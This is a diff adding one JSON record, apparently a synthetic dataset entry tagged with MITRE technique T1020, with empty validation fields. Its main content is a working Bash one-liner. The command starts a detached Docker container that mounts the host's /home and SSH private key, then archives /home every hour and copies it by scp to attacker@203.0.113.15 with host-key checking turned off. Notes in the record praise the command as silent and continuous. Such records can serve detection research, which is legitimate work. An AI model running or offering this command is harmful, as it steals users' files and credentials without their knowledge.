@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_home --network host -v /home:/data:ro -v $HOME/.ssh/id_rsa:/keys/id_rsa:ro bitnami/ssh-client:latest bash -lc 'while true; do TS=$(date +%s); ARCH=/tmp/home_$TS.tgz; tar -C /data -cz . > \"$ARCH\"; scp -q -i /keys/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \"$ARCH\" attacker@203.0.113.15:/var/tmp/$(hostname)_home_$TS.tgz; rm -f \"$ARCH\"; sleep 3600; done'",
+  "explanation": "Automates periodic archival of /home and exfiltrates via scp over SSH using a mounted private key, operating silently and detached.",
+  "rationale_steps": [
+    "Mounts host /home and an SSH key into a container",
+    "Creates timestamped archives to avoid overwriting and aid batching",
+    "Transfers with scp in quiet mode and non-interactive SSH options",
+    "Loops with sleep for continuous automated exfiltration"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-040f3242",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
